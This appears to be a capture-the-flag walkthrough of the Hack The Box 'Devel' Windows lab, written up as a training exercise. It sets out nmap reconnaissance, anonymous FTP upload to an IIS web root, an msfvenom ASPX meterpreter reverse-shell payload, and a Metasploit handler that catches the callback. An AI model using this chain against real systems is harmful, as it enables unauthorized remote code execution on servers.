<div align="left">

<img src="https://img.shields.io/badge/FuzzRaiders_Team_Member-0a66ff?style=flat-square&logo=github" />
<img src="https://img.shields.io/badge/Anka0x-0f172a?style=flat-square" />
<img src="https://img.shields.io/badge/🎯%20Role-Internal_Pentest-1e293b?style=flat-square" />
<img src="https://img.shields.io/badge/📜%20Certification-PNPT_(TCM_Security)-334155?style=flat-square" />
<img src="https://img.shields.io/badge/🟢%20Status-Completed-16a34a?style=flat-square" />

</div>

# Hack The Box: Devel

<div align="left">

![Category: Windows / Web](https://img.shields.io/badge/Category-Windows%20%2F%20Web-red)<br>
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-blue)<br>
![Platform: Hack%20The%20Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-darkgreen)

</div>

---

# 📌 Overview

Devel is a Windows web server lab that demonstrates a classic real‑world failure chain:

* **Anonymous FTP access** exposes the web root
* Uploading a web shell/payload leads to **remote code execution**
* The initial shell runs under a low-privileged IIS identity

This lab builds disciplined service chaining: **Recon → FTP → Web RCE → Shell management**.

---

## 🛠 Tools Used

```
nmap        → service discovery
ftp         → anonymous login + file upload
msfvenom    → generate ASPX payload
msfconsole  → multi/handler + session management
browser     → trigger uploaded payload
```

---

## <h1 style="color:pink;">Walkthrough steps</h1>

---

### Step 1  Recon (Nmap)

**Goal:** Identify exposed services and confirm attack surface.

```bash
nmap -sC -sV -T5 10.129.4.55 -oN nmap_result
```

**What to observe:**

* FTP service exposed
* IIS HTTP service exposed
* Any notes about anonymous FTP

![images](Images/1.png)

---

### Step 2 Anonymous FTP Login

**Goal:** Validate whether FTP allows anonymous access.

```bash
ftp 10.129.4.55
# Name: anonymous
# Password: anonymous (or blank)
```

**What to observe:**

* Successful anonymous login
* Visible web directory/files

![images](Images/2.png)

---

### Step 3 Confirm Writable Location

**Goal:** Identify if we can upload into web root.

```text
ftp> ls
ftp> dir
```

**What to observe:**

* Web root files such as `iisstart.htm` / `welcome.png`
* A directory like `aspnet_client`

![images](Images/2.png)

---

### Step 4 Generate an ASPX Payload

**Goal:** Create an ASPX payload that will connect back to our listener.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.197 LPORT=1234 -f aspx > devel.aspx
```

**What to observe:**

* Payload created successfully
* File size/output confirmation

![images](Images/3.png)

---

### Step 5 Upload Payload via FTP

**Goal:** Upload the ASPX file into the web root.

```text
ftp> put devel.aspx
ftp> ls
```

**What to observe:**

* Upload completes
* `devel.aspx` appears in listing

![images](Images/4.png)

---

### Step 6 Start Metasploit Handler

**Goal:** Start a listener to catch the reverse connection.

```text
msfconsole
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.15.197
set LPORT 1234
run -j
```

**What to observe:**

* Handler running and waiting

![images](Images/5.png)
![images](Images/6.png)
---

### Step 7 Trigger Payload via Browser

**Goal:** Execute the uploaded ASPX by visiting it.

```text
http://10.129.4.55/devel.aspx
```

**What to observe:**

* Web request triggers connection
* Meterpreter session opens

![images](Images/7.png)

---

### Step 8  Interact with Session and Confirm Context

**Goal:** Interact with the session and identify current privileges.

```text
sessions -i <id>
getuid
```

**What to observe:**

* User context typically: `IIS APPPOOL\Web`


![images](Images/8.png)
---

## 🧠 What This Lab Teaches

* Why **anonymous FTP** is a critical enterprise risk
* How service chaining works: FTP write → web execution
* Basic payload handling and session control
* The importance of validating execution context after initial access

---

## 📌 Conclusion

Devel reinforces a simple but brutal lesson:

> If an attacker can write to the web root, they can usually execute code.

This machine is a strong foundation for internal methodology: enumerate exposed services, validate permissions, chain misconfigurations, and control shells cleanly.

---

This work is part of **FuzzRaiders**’ structured hands-on training and research program, where every lab, project, and technical study is formally documented, reviewed, and validated to ensure real-world applicability, methodological rigor and real-world security execution

Happy hacking 🚀

---

### Author
## [LinkedIn:](https://www.linkedin.com/in/manka-sec/)
---
